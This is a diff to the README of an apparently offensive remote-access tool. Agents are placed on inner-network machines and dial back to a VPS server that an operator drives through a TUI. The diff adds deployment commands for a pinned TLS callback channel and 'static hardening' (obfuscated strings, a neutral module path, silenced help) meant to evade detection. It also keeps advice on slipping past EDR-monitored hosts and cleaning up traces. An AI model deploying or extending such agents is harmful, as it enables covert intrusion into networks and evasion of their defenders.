@@ -58,6 +58,11 @@ ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
 # 3. Deploy agent on the inner-network machine (zero-dependency, upload and run; see bin/ for platforms)
 ./agent-linux-amd64 -c <vps>:9000 -t <token> -i <unique-host-name> -q
 
+# TLS channel (v1.1, recommended when agents dial the public server directly):
+#   add -tls to server (auto-generates cert & prints pin fp); agent dials with -tls -pin <fp>
+./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
+./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server-fp>
+
 # 4. Operate locally (rtxctl wraps token / default agent)
 rtxctl connect          # TUI picker → enter an execution environment
 rtxctl ls               # list online agents
@@ -81,6 +86,8 @@ rtxctl upload -path /tmp/x -file ./local
 
 - Control API binds 127.0.0.1 only (accessed locally via SSH tunnel)
 - Agent registration requires token authentication
+- **TLS channel (v1.1)**: server `-tls` self-signed cert + agent `-tls -pin <fp>` certificate pinning
+- **Static hardening (v1.1)**: neutral module path, XOR-obfuscated key strings, silenced help text
 - Operational note: on EDR-monitored hosts, deploy agents through legitimate channels; kill and clean up residuals afterwards
 
 ## Credits
